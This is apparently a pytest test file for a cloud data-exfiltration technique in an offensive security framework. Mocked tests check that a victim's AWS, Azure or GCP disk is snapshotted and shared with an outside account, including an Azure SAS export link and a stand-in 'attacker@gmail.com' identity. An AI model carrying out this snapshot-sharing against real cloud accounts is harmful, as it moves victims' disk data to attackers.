# ================================================================
# TESTS: exfiltration/share_disk_snapshot
# ================================================================

import pytest
from unittest.mock import MagicMock, patch
from quantum_mechanic.core.context import ExecutionContext
from quantum_mechanic.techniques.exfiltration.share_disk_snapshot import execute

@pytest.fixture
def mock_ctx():
    ctx = MagicMock(spec=ExecutionContext)
    ctx.safe_mode = False
    ctx.session = MagicMock()
    return ctx

def test_aws_exfil_success(mock_ctx):
    """Successfully share an AWS EBS snapshot."""
    mock_ctx.provider_name = "aws"
    mock_ctx.params = {"target_id": "vol-123", "share_with": "111222333444"}
    
    mock_ec2 = MagicMock()
    mock_ctx.session.client.return_value = mock_ec2
    
    mock_ec2.create_snapshot.return_value = {"SnapshotId": "snap-123"}
    
    result = execute(mock_ctx)
    
    assert result["results"][0]["status"] == "Shared"
    assert result["results"][0]["snapshot_id"] == "snap-123"
    mock_ec2.modify_snapshot_attribute.assert_called_once()

def test_azure_exfil_success(mock_ctx):
    """Successfully export an Azure disk via SAS."""
    import sys
    mock_ctx.provider_name = "azure"
    mock_ctx.params = {"target_id": "/subscriptions/s/resourceGroups/r/providers/Microsoft.Compute/disks/d"}
    mock_ctx.whoami.return_value.extra = {"location": "eastus"}
    
    mock_compute = MagicMock()
    mock_compute_client = MagicMock()
    mock_compute.ComputeManagementClient.return_value = mock_compute_client
    
    mock_sas_res = MagicMock()
    mock_sas_res.access_sas = "https://exfil-link"
    mock_compute_client.snapshots.begin_grant_access.return_value.result.return_value = mock_sas_res
    
    # Mock models
    mock_models = MagicMock()
    
    mock_azure = MagicMock()
    mock_azure.mgmt.compute = mock_compute
    mock_azure.mgmt.compute.models = mock_models
    
    with patch.dict(sys.modules, {"azure.mgmt.compute": mock_azure.mgmt.compute, "azure.mgmt.compute.models": mock_models}):
        result = execute(mock_ctx)
        
    assert result["results"][0]["status"] == "Exported"
    assert result["results"][0]["exfil_path"] == "https://exfil-link"

def test_gcp_exfil_success(mock_ctx):
    """Successfully share a GCP disk snapshot."""
    mock_ctx.provider_name = "gcp"
    mock_ctx.params = {"target_id": "disk-1", "share_with": "attacker@gmail.com", "zone": "us-east1-a"}
    mock_ctx.whoami.return_value.account_id = "proj-1"
    
    with patch("googleapiclient.discovery.build") as mock_build:
        mock_compute = MagicMock()
        mock_build.return_value = mock_compute
        
        mock_compute.snapshots().getIamPolicy().execute.return_value = {"bindings": []}
        
        result = execute(mock_ctx)
        
    assert result["results"][0]["status"] == "Shared"
    assert result["results"][0]["exfil_path"] == "attacker@gmail.com"
    mock_compute.snapshots().setIamPolicy.assert_called_once()
